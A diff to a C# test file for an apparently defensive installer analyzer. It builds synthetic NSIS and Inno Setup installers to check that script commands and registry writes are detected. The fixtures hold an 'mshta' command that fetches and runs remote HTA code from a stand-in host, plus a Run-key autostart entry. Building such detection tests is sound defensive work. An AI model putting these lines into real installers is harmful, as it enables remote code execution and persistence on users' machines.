@@ -2,6 +2,8 @@ using System.IO.Compression;
 using System.Text;
 using Corvus.Core;
 using Corvus.Core.Installers;
+using Corvus.Native.Providers;
+using Corvus.Services.Analysis;
 
 namespace Corvus.Tests;
 
@@ -140,8 +142,10 @@ public sealed class InstallerStubTests
     /// <summary>
     /// A Unicode NSIS installer, one solid deflate stream: SetOutPath $INSTDIR\sub, File a.txt, File /oname=$PLUGINSDIR\p.dll,
     /// WriteUninstaller $INSTDIR\uninst.exe. <paramref name="wide"/> writes the block headers of a 64-bit build (8-byte offsets).
+    /// With <paramref name="commands"/>, entries 4 to 12 follow: Exec, ExecWait, ExecShell, two pushes, a plugin call,
+    /// WriteRegStr twice and WriteRegDWORD; <paramref name="opcode"/> replaces the last entry's opcode.
     /// </summary>
-    private static byte[] NsisFixture(bool wide = false)
+    private static byte[] NsisFixture(bool wide = false, bool commands = false, int opcode = 0)
     {
         var strings = new MemoryStream();
         strings.Write([0, 0]);
@@ -154,19 +158,35 @@ public sealed class InstallerStubTests
             return index;
         }
         const int InstDir = 21, PluginsDir = 26;
-        int[][] code =
+        List<int[]> code =
         [
             [11, String(InstDir, @"\sub"), 1, 0, 0, 0, 0],
             [20, 0, String("a.txt"), 0, 0, 0, 0],
             [20, 0, String(PluginsDir, @"\p.dll"), 9, 0, 0, 0],
             [62, String(InstDir, @"\uninst.exe"), 16, 0, 0, 0, 0],
         ];
-        int entriesAt = 4 + 8 * (wide ? 12 : 8), stringsAt = entriesAt + code.Length * 28, langAt = stringsAt + (int)strings.Length;
+        if (commands)
+        {
+            code.AddRange(
+            [
+                [41, String("cmd /c echo test"), 0, 0, 0, 0, 0],
+                [41, String("mshta http://example.test/run.hta"), 5, 1, 0, 0, 0],
+                [40, String("open"), String("http://example.test/a"), String("/q"), 1, 0, 0],
+                [31, String("second"), 0, 0, 0, 0, 0],
+                [31, String("first"), 0, 0, 0, 0, 0],
+                [44, String(PluginsDir, @"\sys.dll"), String("Call"), 0, 0, 1, 0],
+                [51, unchecked((int)0x80000002), String(@"Software\Corvus"), String("Mode"), String("fast"), 1, 1],
+                [51, unchecked((int)0x80000001), String(@"Software\Microsoft\Windows\CurrentVersion\Run"), String("Corvus"), String(InstDir, @"\app.exe"), 1, 1],
+                [51, unchecked((int)0x80000001), String(@"Software\Corvus"), String("Count"), String("7"), 4, 4],
+            ]);
+            if (opcode != 0) code[^1][0] = opcode;
+        }
+        int entriesAt = 4 + 8 * (wide ? 12 : 8), stringsAt = entriesAt + code.Count * 28, langAt = stringsAt + (int)strings.Length;
         var header = new BinaryWriter(new MemoryStream());
         header.Write(0);
         for (int i = 0; i < 8; i++)
         {
-            var (at, count) = i switch { 2 => (entriesAt, code.Length), 3 => (stringsAt, 0), 4 => (langAt, 0), _ => (0, 0) };
+            var (at, count) = i switch { 2 => (entriesAt, code.Count), 3 => (stringsAt, 0), 4 => (langAt, 0), _ => (0, 0) };
             if (wide) header.Write((long)at);
             else header.Write(at);
             header.Write(count);
@@ -209,9 +229,10 @@ public sealed class InstallerStubTests
     /// <summary>
     /// An Inno Setup 6.7.0 installer (with <paramref name="older"/>, data 5.5.7 (u): 32-bit sizes, SHA-1, no encryption header)
     /// with uncompressed setup-0 blocks: AppName "Sample", one stored file {app}\a.txt and the uninstaller entry; the offset
-    /// table (RCDATA 11111) points past the image.
+    /// table (RCDATA 11111) points past the image. With <paramref name="script"/>, one [Registry] entry and two [Run] entries
+    /// follow the files, and the header carries compiled Pascal code.
     /// </summary>
-    private static byte[] InnoFixture(bool older = false)
+    private static byte[] InnoFixture(bool older = false, bool script = false)
     {
         var content = "inno file"u8.ToArray();
         byte[] Block(byte[] data)
@@ -226,10 +247,15 @@ public sealed class InstallerStubTests
             foreach (var c in chunks) { o.Write(System.IO.Hashing.Crc32.HashToUInt32(c)); o.Write(c); }
             return ((MemoryStream)o.BaseStream).ToArray();
         }
-        static void Record(BinaryWriter w, string[] strings, int ansi, byte[] fixedPart)
+        static void Record(BinaryWriter w, string[] strings, int ansi, byte[] fixedPart, byte[]? lastAnsi = null)
         {
             foreach (var s in strings) { var b = Encoding.Unicode.GetBytes(s); w.Write(b.Length); w.Write(b); }
-            for (int i = 0; i < ansi; i++) w.Write(0);
+            for (int i = 0; i < ansi; i++)
+            {
+                var text = i == ansi - 1 ? lastAnsi ?? [] : [];
+                w.Write(text.Length);
+                w.Write(text);
+            }
             w.Write(fixedPart);
         }
         var first = new BinaryWriter(new MemoryStream());
@@ -238,7 +264,15 @@ public sealed class InstallerStubTests
         var header = new byte[headerSize];
         BitConverter.TryWriteBytes(header.AsSpan(files), 2); // file entries
         BitConverter.TryWriteBytes(header.AsSpan(files + 4), 1); // file locations
-        Record(first, ["Sample", .. Enumerable.Repeat("", 8), "1.0", .. Enumerable.Repeat("", strings - 10)], 4, header);
+        // Header count offsets of the registry and run entries (UninstallRun follows Run).
+        var (registryCount, runCount) = older ? (44, 56) : (48, 60);
+        if (script)
+        {
+            BitConverter.TryWriteBytes(header.AsSpan(registryCount), 1);
+            BitConverter.TryWriteBytes(header.AsSpan(runCount), 1);
+            BitConverter.TryWriteBytes(header.AsSpan(runCount + 4), 1);
+        }
+        Record(first, ["Sample", .. Enumerable.Repeat("", 8), "1.0", .. Enumerable.Repeat("", strings - 10)], 4, header, script ? [1, 2, 3] : null);
         var file = new byte[fileSize];
         BitConverter.TryWriteBytes(file.AsSpan(locationAt), 0);
         Record(first, ["a.txt", @"{app}\a.txt", .. Enumerable.Repeat("", fileStrings - 2)], fileAnsi, file);
@@ -246,6 +280,19 @@ public sealed class InstallerStubTests
         BitConverter.TryWriteBytes(uninstaller.AsSpan(locationAt), -1);
         uninstaller[typeAt] = 1;
         Record(first, ["", @"{app}\unins000.exe", .. Enumerable.Repeat("", fileStrings - 2)], fileAnsi, uninstaller);
+        if (script)
+        {
+            var registry = new byte[29];
+            BitConverter.TryWriteBytes(registry.AsSpan(20), 0x80000002u);
+            registry[26] = 1;
+            Record(first, [@"Software\Corvus", "Mode", "fast", .. Enumerable.Repeat("", 6)], 0, registry);
+            foreach (var (name, parameters, options) in new[] { ("cmd", "/c echo test", (byte)0), (@"{app}\setup.exe", "", (byte)1) })
+            {
+                var run = new byte[27];
+                run[25] = options;
+                Record(first, [name, parameters, .. Enumerable.Repeat("", 11)], 0, run);
+            }
+        }
         var location = new byte[older ? 74 : 89];
         int sizes = older ? 20 : 24;
         BitConverter.TryWriteBytes(location.AsSpan(sizes), (long)content.Length);
@@ -299,16 +346,147 @@ public sealed class InstallerStubTests
         Assert.DoesNotContain(c.Notes, n => n.Contains("stored hash", StringComparison.Ordinal));
     }
 
+    private static InstallerFileView.Facts Facts(byte[] setup) =>
+        (InstallerFileView.Facts)new InstallerFileView().Inspect(new FileInput("setup.exe", setup, Blob.Identify(setup)), default)!.Detail;
+
     [Fact]
-    [FuzzEntry(typeof(SquirrelSetupReader), typeof(BurnBundleReader), typeof(NsisInstallerReader), typeof(InnoSetupReader))]
+    public void An_NSIS_script_lists_its_commands_and_registry_writes_at_their_entries()
+    {
+        var f = Facts(NsisFixture(commands: true));
+        Assert.Equal("NSIS installer", f.Format);
+        Assert.Null(f.CommandsUnknown);
+        Assert.Equal(
+            [(4, "Exec", "cmd /c echo test"), (5, "ExecWait", "mshta http://example.test/run.hta"), (6, "ExecShell", "open http://example.test/a /q"), (9, "PluginCall", @"$PLUGINSDIR\sys.dll!Call(first, second)")],
+            f.Commands!.Select(c => (c.Index, c.Kind, c.Text)));
+        Assert.Equal(
+            [(10, "WriteRegStr", @"HKLM\Software\Corvus", "Mode", "fast"), (11, "WriteRegStr", @"HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "Corvus", @"$INSTDIR\app.exe"),
+             (12, "WriteRegDWORD", @"HKCU\Software\Corvus", "Count", "7")],
+            f.Registry.Select(r => (r.Index!.Value, r.Kind!, r.Key, r.Name!, r.Value!)));
+    }
+
+    [Fact]
+    public void An_NSIS_command_and_an_autostart_value_reach_the_findings()
+    {
+        var setup = NsisFixture(commands: true);
+        var findings = new InstallerFileView().Inspect(new FileInput("setup.exe", setup, Blob.Identify(setup)), default)!.Findings;
+        Assert.Contains(findings, x => x.Rule == "installer/suspicious" && x.Evidence.Contains(@"CurrentVersion\Run\Corvus", StringComparison.Ordinal));
+        Assert.Contains(findings, x => x.Rule == "launcher/command-line" && x.Evidence.StartsWith("mshta", StringComparison.Ordinal));
+        Assert.DoesNotContain(findings, x => x.Evidence.Contains("echo", StringComparison.Ordinal));
+    }
+
+    [Fact]
+    public void A_plain_NSIS_installer_has_no_script_command()
+    {
+        var f = Facts(NsisFixture());
+        Assert.Empty(f.Commands!);
+        Assert.Empty(f.Registry);
+        Assert.Null(f.CommandsUnknown);
+    }
+
+    [Fact]
+    public void An_NSIS_entry_table_with_an_unknown_opcode_reports_its_commands_as_unknown()
+    {
+        var f = Facts(NsisFixture(commands: true, opcode: 200));
+        Assert.Contains("opcode 200", f.CommandsUnknown, StringComparison.Ordinal);
+        Assert.Empty(f.Commands!);
+        Assert.Empty(f.Registry);
+    }
+
+    [Theory]
+    [InlineData(false)]
+    [InlineData(true)]
+    public void An_Inno_Setup_script_lists_its_run_and_registry_entries(bool older)
+    {
+        var f = Facts(InnoFixture(older, script: true));
+        Assert.Equal("Inno Setup installer", f.Format);
+        Assert.Equal(
+            [(0, "Run", "cmd /c echo test"), (0, "UninstallRun (shell execute)", @"{app}\setup.exe")],
+            f.Commands!.Select(c => (c.Index, c.Kind, c.Text)));
+        var r = Assert.Single(f.Registry);
+        Assert.Equal((0, "Registry string", @"HKLM\Software\Corvus", "Mode", "fast"), (r.Index!.Value, r.Kind!, r.Key, r.Name!, r.Value!));
+        Assert.True(f.CompiledCode);
+    }
+
+    [Fact]
+    public void A_plain_Inno_Setup_installer_has_no_run_entry_and_no_Pascal_script()
+    {
+        var f = Facts(InnoFixture());
+        Assert.Empty(f.Commands!);
+        Assert.Empty(f.Registry);
+        Assert.False(f.CompiledCode);
+        Assert.Null(f.CommandsUnknown);
+    }
+
+    [Theory]
+    [InlineData("InstallShield 2020 Premier", "InstallShield")]
+    [InlineData("Advanced Installer 19.0 build 1", "Advanced Installer")]
+    [InlineData("Windows Installer XML Toolset", null)]
+    [InlineData(null, null)]
+    public void A_creating_application_names_its_builder(string? text, string? builder) => Assert.Equal(builder, InstallerFileView.BuilderOf(text));
+
+    /// <summary>The reference compiler of the test installers: its variable, and its arguments with {script} replaced.</summary>
+    private static readonly (string Variable, string[] Arguments) NsisCompiler = ("CORVUS_NSIS_COMPILER", ["/V1", "{script}"]);
+
+    /// <summary>Builds <c>setup.exe</c> from <paramref name="script"/> in a folder holding <c>payload.txt</c>.</summary>
+    private static byte[] BuildNsis(string script)
+    {
+        using var dir = new TempDir();
+        File.WriteAllText(dir.File("payload.txt"), "payload");
+        File.WriteAllText(dir.File("setup.nsi"), script);
+        var args = NsisCompiler.Arguments.Select(a => a.Replace("{script}", "setup.nsi")).ToList();
+        var run = ExternalTools.Run(Environment.GetEnvironmentVariable(NsisCompiler.Variable)!, args, TimeSpan.FromMinutes(2), 16 << 20, default, workingDirectory: dir.Path);
+        Assert.True(run.ExitCode == 0, run.Text + run.Stderr);
+        return File.ReadAllBytes(dir.File("setup.exe"));
+    }
+
+    [RequiresRealDataFact("CORVUS_NSIS_COMPILER")]
+    [Trait("Speed", "Slow")]
+    [Permit("reference-tool")]
+    public void A_built_NSIS_installer_shows_its_command_and_registry_value()
+    {
+        var f = Facts(BuildNsis("""
+            OutFile "setup.exe"
+            RequestExecutionLevel user
+            Section
+              SetOutPath "$INSTDIR"
+              File "payload.txt"
+              Exec "cmd /c echo test"
+              WriteRegStr HKCU "Software\CorvusSample" "Mode" "fast"
+            SectionEnd
+            """));
+        Assert.Null(f.CommandsUnknown);
+        Assert.Contains(f.Commands!, c => c is { Kind: "Exec", Text: "cmd /c echo test" });
+        Assert.Contains(f.Registry, r => r is { Kind: "WriteRegStr", Key: @"HKCU\Software\CorvusSample", Name: "Mode", Value: "fast" });
+    }
+
+    [RequiresRealDataFact("CORVUS_NSIS_COMPILER")]
+    [Trait("Speed", "Slow")]
+    [Permit("reference-tool")]
+    public void A_built_NSIS_installer_that_copies_one_file_shows_no_Exec_entry()
+    {
+        var f = Facts(BuildNsis("""
+            OutFile "setup.exe"
+            RequestExecutionLevel user
+            Section
+              SetOutPath "$INSTDIR"
+              File "payload.txt"
+            SectionEnd
+            """));
+        Assert.Null(f.CommandsUnknown);
+        Assert.DoesNotContain(f.Commands!, c => c.Kind.StartsWith("Exec", StringComparison.Ordinal));
+    }
+
+    [Fact]
+    [FuzzEntry(typeof(SquirrelSetupReader), typeof(BurnBundleReader), typeof(NsisInstallerReader), typeof(InnoSetupReader), typeof(InstallerFileView))]
     public void Fuzzed_installer_stubs_never_throw_past_a_tool_error()
     {
         var squirrel = Stub("DATA", 131, Zip(("RELEASES", Encoding.ASCII.GetBytes($"{new string('A', 40)} A-1-full.nupkg 3\n")), ("A-1-full.nupkg", [1, 2, 3])));
-        foreach (var seed in new[] { squirrel, BurnFixture(), NsisFixture(), InnoFixture() })
+        foreach (var seed in new[] { squirrel, BurnFixture(), NsisFixture(), InnoFixture(), NsisFixture(commands: true), InnoFixture(script: true), InnoFixture(older: true, script: true) })
         {
             var failures = FormatFuzz.Run(seed, b =>
             {
                 try { Containers.Open(b, "Setup.exe", AnalysisLimits.Default, default, allFiles: true); } catch (ToolError) { }
+                try { new InstallerFileView().Inspect(new FileInput("Setup.exe", b, Blob.Identify(b)), default); } catch (ToolError) { }
             }, 300);
             Assert.True(failures.Count == 0, string.Join("\n", failures.Take(20)));
         }
